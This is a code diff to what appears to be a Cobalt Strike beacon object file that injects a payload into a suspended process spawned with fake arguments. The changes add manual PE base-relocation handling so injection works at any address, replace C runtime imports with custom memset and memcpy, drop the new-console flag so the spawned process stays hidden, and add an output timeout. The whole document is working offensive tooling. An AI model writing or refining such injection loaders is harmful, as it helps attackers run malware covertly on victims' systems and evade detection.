@@ -12,9 +12,24 @@
 #define MAX_NUM(a, b) a > b ? a : b;
 #define MIN_NUM(a, b) a < b ? a : b;
 #define MAX_INDIVIDUAL_CMDLINE_ARG_LEN 1000
+#define BOF_OUTPUT_TIMEOUT_MS 30000
+#define BOF_POLL_INTERVAL_MS  200
+
+void *_memset(void *dest, int c, size_t n) {
+    unsigned char *d = (unsigned char *)dest;
+    while (n--) *d++ = (unsigned char)c;
+    return dest;
+}
+
+void *_memcpy(void *dest, const void *src, size_t n) {
+    unsigned char *d = (unsigned char *)dest;
+    const unsigned char *s = (const unsigned char *)src;
+    while (n--) *d++ = *s++;
+    return dest;
+}
 
 void ZeroMemoryCustom(BYTE* pAddress, DWORD dwSize) {
-    MSVCRT$memset(pAddress, 0, dwSize);
+    _memset(pAddress, 0, dwSize);
 }
 
 void StrCat(PCHAR destination, PCHAR source, DWORD sourceLenMax) {
@@ -31,7 +46,7 @@ DWORD64 LoadShellcodeIntoMemory(OUT VOID** ppShellcodeStorage) {
         BeaconPrintf(CALLBACK_ERROR,"VirtualAlloc failed: %lu", KERNEL32$GetLastError());
         return 0;
     }
-    MSVCRT$memcpy(*ppShellcodeStorage, shellcode, sizeof(shellcode));
+    _memcpy(*ppShellcodeStorage, shellcode, sizeof(shellcode));
     return sizeof(shellcode);
 }
 
@@ -167,7 +182,7 @@ BOOL SpawnSuspendedProcess(IN LPCSTR szProcessPath, IN OPTIONAL LPCSTR szArgumen
 
     // Create process with fake arguments using CreateProcessA
     if (!KERNEL32$CreateProcessA(NULL, szFakeCommandLine, NULL, NULL, TRUE,
-        CREATE_SUSPENDED | CREATE_NO_WINDOW | CREATE_NEW_CONSOLE, NULL, NULL, &stStartupInfo, pProcInfo)) {
+        CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &stStartupInfo, pProcInfo)) {
         BeaconPrintf(CALLBACK_ERROR, "CreateProcessA failed: %lu", KERNEL32$GetLastError());
         goto CLEANUP;
     }
@@ -317,13 +332,45 @@ BOOL DeployPayload(IN BYTE* pPayloadData, IN LPCSTR szTargetPath, IN OPTIONAL LP
     pRemoteMem = (BYTE*)KERNEL32$VirtualAllocEx(stProcInfo.hProcess, (PVOID)pNtHeaders->OptionalHeader.ImageBase,
         pNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!pRemoteMem) {
-        BeaconPrintf(CALLBACK_ERROR,"VirtualAllocEx, error: %lu", KERNEL32$GetLastError());
-        goto CLEANUP;
+        pRemoteMem = (BYTE*)KERNEL32$VirtualAllocEx(stProcInfo.hProcess, NULL,
+            pNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (!pRemoteMem) {
+            BeaconPrintf(CALLBACK_ERROR,"VirtualAllocEx, error: %lu", KERNEL32$GetLastError());
+            goto CLEANUP;
+        }
     }
 
     if (pRemoteMem != (BYTE*)pNtHeaders->OptionalHeader.ImageBase) {
-        BeaconPrintf(CALLBACK_ERROR,"[!] Relocation required (unsupported)\n, error: %lu", KERNEL32$GetLastError());
-        goto CLEANUP;
+        ULONG_PTR uDelta = (ULONG_PTR)pRemoteMem - pNtHeaders->OptionalHeader.ImageBase;
+        IMAGE_DATA_DIRECTORY relocDir = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+        if (relocDir.Size == 0) {
+            BeaconPrintf(CALLBACK_ERROR,"[!] Relocation needed but PE has no reloc table");
+            goto CLEANUP;
+        }
+        BYTE* pRelocBlock = pPayloadData + relocDir.VirtualAddress;
+        DWORD dwRelocProcessed = 0;
+        while (dwRelocProcessed < relocDir.Size) {
+            DWORD dwPageRva   = *(DWORD*)(pRelocBlock);
+            DWORD dwBlockSize = *(DWORD*)(pRelocBlock + 4);
+            if (dwBlockSize == 0) break;
+            DWORD dwEntryCount = (dwBlockSize - 8) / 2;
+            WORD* pEntries = (WORD*)(pRelocBlock + 8);
+            for (DWORD j = 0; j < dwEntryCount; j++) {
+                WORD wEntry = pEntries[j];
+                BYTE bType = (BYTE)(wEntry >> 12);
+                WORD wOffset = wEntry & 0x0FFF;
+                if (bType == IMAGE_REL_BASED_DIR64) {
+                    ULONG_PTR *pPatch = (ULONG_PTR*)(pPayloadData + dwPageRva + wOffset);
+                    *pPatch += uDelta;
+                } else if (bType == IMAGE_REL_BASED_HIGHLOW) {
+                    DWORD *pPatch = (DWORD*)(pPayloadData + dwPageRva + wOffset);
+                    *pPatch += (DWORD)uDelta;
+                }
+            }
+            pRelocBlock += dwBlockSize;
+            dwRelocProcessed += dwBlockSize;
+        }
+        pNtHeaders->OptionalHeader.ImageBase = (ULONG_PTR)pRemoteMem;
     }
 
     if (!KERNEL32$WriteProcessMemory(stProcInfo.hProcess, pRemoteMem, pPayloadData,
@@ -375,7 +422,8 @@ BOOL DeployPayload(IN BYTE* pPayloadData, IN LPCSTR szTargetPath, IN OPTIONAL LP
     }
 
     DWORD dwExitCode = STILL_ACTIVE;
-    while (TRUE) {
+    DWORD dwElapsed = 0;
+    while (dwElapsed < BOF_OUTPUT_TIMEOUT_MS) {
         if (!KERNEL32$GetExitCodeProcess(stProcInfo.hProcess, &dwExitCode)) {
             BeaconPrintf(CALLBACK_ERROR, "GetExitCodeProcess failed: %lu", KERNEL32$GetLastError());
             break;
@@ -383,10 +431,16 @@ BOOL DeployPayload(IN BYTE* pPayloadData, IN LPCSTR szTargetPath, IN OPTIONAL LP
         if (dwExitCode != STILL_ACTIVE) break;
 
         DisplayProcessOutput(hOutputPipe);
-        KERNEL32$Sleep(100);
+        KERNEL32$Sleep(BOF_POLL_INTERVAL_MS);
+        dwElapsed += BOF_POLL_INTERVAL_MS;
     }
 
     DisplayProcessOutput(hOutputPipe);
+
+    if (dwElapsed >= BOF_OUTPUT_TIMEOUT_MS && dwExitCode == STILL_ACTIVE) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[!] Timeout reached, terminating process");
+        KERNEL32$TerminateProcess(stProcInfo.hProcess, 0);
+    }
 
     bSuccess = TRUE;
 
